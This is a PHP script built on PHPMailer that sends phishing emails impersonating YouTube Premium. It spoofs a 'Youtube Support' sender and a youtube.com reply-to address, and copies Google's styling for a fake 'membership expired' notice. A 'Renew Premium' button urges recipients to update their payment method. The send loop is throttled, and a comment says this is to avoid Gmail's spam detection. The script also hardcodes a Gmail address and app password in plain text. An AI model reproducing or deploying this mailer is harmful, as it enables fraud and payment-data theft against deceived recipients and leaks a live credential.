<?php
require_once(__DIR__ . "/../vendor/autoload.php");

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

function sendOrderEmail($to, $subject, $body) {
$mail=new PHPMailer(true);

try{
    $mail->CharSet = "UTF-8";
    $mail->IsSMTP();
    $mail->Host = "smtp.gmail.com";
    $mail->SMTPAuth = true;
    $mail->Username = 'kaihongoh5@gmail.com';
    $mail->Password = 'emys ikzm qyoc zrnp';
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587;

    //sender 
    $mail->setFrom('kaihongoh5@gmail.com','Youtube Support');
    $mail->addReplyTo('noreply@youtube.com','No-Reply');
    //receiver
    $mail->addAddress($to);

    //content
    $mail->isHTML(true);
    $mail->Subject = $subject;
    $mail->Body = $body;

    $mail->send();
    return true;
} catch(Exception $e){
    return$mail->ErrorInfo;
    }
}

// --- 1. 定义高仿 Google 安全/通知样式的 HTML 模板 ---
$html_template = '
<div style="font-family: Roboto, Arial, sans-serif; border: 1px solid #e0e0e0; border-radius: 8px; max-width: 530px; margin: 20px auto; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.1); background-color: #ffffff;">
    <div style="background-color: #FF0000; height: 10px;"></div>
    
    <div style="padding: 40px 30px;">
        <div style="margin-bottom: 25px; display: flex; align-items: center;">
            <span style="background-color: #FF0000; color: white; padding: 2px 8px; border-radius: 6px; font-weight: bold; font-size: 18px; margin-right: 5px;">▶</span>
            <span style="font-size: 22px; font-weight: bold; color: #282828; letter-spacing: -1px;">YouTube</span>
            <span style="font-size: 12px; color: #606060; vertical-align: top; margin-left: 2px;">Premium</span>
        </div>

        <h2 style="font-size: 20px; color: #0f0f0f; margin-bottom: 15px; font-weight: 600; line-height: 1.4;">
            Your membership has expired
        </h2>
        
        <p style="font-size: 14px; color: #0f0f0f; line-height: 1.6;">
            The recurring billing for your <strong>YouTube Premium</strong> subscription has failed, and your benefits have been suspended as of 19/3/2026.
        </p>

        <div style="background-color: #f9f9f9; border-radius: 8px; padding: 18px; margin: 25px 0; border: 1px dotted #ccc;">
            <p style="margin: 0; font-size: 13px; color: #606060; line-height: 1.5;">
                <strong>What you\'re missing out on:</strong><br>
                • Ad-free videos & YouTube Music<br>
                • Background play on mobile<br>
                • Offline downloads
            </p>
        </div>

        <p style="font-size: 13px; color: #606060; margin-bottom: 30px;">
            To keep your Premium benefits, please update your payment method or renew manually.
        </p>

        <div style="text-align: left;">
            <a href="http://localhost/your-project/renew.php" 
               style="background-color: #065fd4; color: #ffffff; padding: 10px 24px; text-decoration: none; border-radius: 20px; font-weight: 500; font-size: 14px; display: inline-block;">
               Renew Premium
            </a>
        </div>
    </div>

    <div style="background-color: #f1f1f1; padding: 20px; text-align: center; font-size: 12px; color: #606060; border-top: 1px solid #e5e5e5; line-height: 1.4;">
        Sent to: <strong>%EMAIL%</strong><br>
        © 2026 Google LLC, d/b/a YouTube, 901 Cherry Ave, San Bruno, CA 94066
    </div>
</div>
';

// --- 2. 调用函数发送 ---
echo "正在准备发送高级模板邮件...<br>";
$users=['giokbenggoo5773@gmail.com','kaiyenoh@gmail.com'];
$success_list = [];
$fail_list = [];
foreach ($users as $email) {
    // 替换占位符，生成个性化内容
    $personalized_body = str_replace('%EMAIL%', $email, $html_template);
    
    // 调用之前定义的函数
    $result = sendOrderEmail($email, 'YouTube Premium Subscription Expired', $personalized_body);
    
    if ($result === true) {
        echo "✅ <span style='color:green;'>已寄给: $email</span><br>";
        $success_list[] = $email;
    } else {
        echo "❌ <span style='color:red;'>失败: $email (原因: $result)</span><br>";
        $fail_list[] = $email;
    }

    // 【重要】每发一封，暂停 0.5 秒。
    // 这能有效防止被 Gmail 判定为大规模垃圾邮件攻击。
    usleep(500000); 
}
// --- 3. 结果判断 ---
echo "<hr>";
echo "<div style='padding:15px; border-radius:5px; font-family:sans-serif; background-color:" . (empty($fail_list) ? "#e6fffa" : "#fff5f5") . ";'>";
echo "<strong>任务结束报告：</strong><br>";
echo "成功发送: " . count($success_list) . " 封<br>";
if (!empty($fail_list)) {
    echo "失败数量: " . count($fail_list) . " 封<br>";
}
echo "</div>";
?>